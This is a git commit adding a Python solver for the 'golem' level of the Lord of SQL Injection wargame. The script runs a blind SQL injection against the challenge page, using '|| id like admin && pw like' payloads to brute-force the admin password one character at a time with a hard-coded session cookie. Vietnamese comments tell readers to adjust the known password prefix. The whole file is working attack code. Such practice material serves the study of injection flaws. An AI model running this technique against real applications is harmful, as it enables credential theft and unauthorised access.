d5b1549e31cb5e82e4520ff8517a0bdbd2113c9e
Spycio.Kon <77606941+tiyeume25112004@users.noreply.github.com>
2022-12-22 19:45:20 +0700

    Create LORD_OF_SQLINJECTION_GOLEM.py

---
+++ LORD_OF_SQLINJECTION_GOLEM.py
@@ -0,0 +1,15 @@
+import requests
+words='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxy'
+url='https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php'
+a=""
+cookies={
+    "PHPSESSID":"s1v411n37ev0ot5ra291moeav0"
+    }
+for i in words:
+ params={"pw":"' || id like'admin' &&pw like '77d6290"+str(i)+"%"}
+ r=requests.get(url,params=params,cookies=cookies)
+ if "Hello admin" in r.text.split("<strong>")[1].split("code")[0]:
+   a+=str(i)
+   print(a)
+# code tui khá rởm nên các bạn tự thêm bớt chỗ '77d6290' nếu muốn tự làm lại nha
+# lúc đầu sài hàm length rồi brute-force thôi V: 
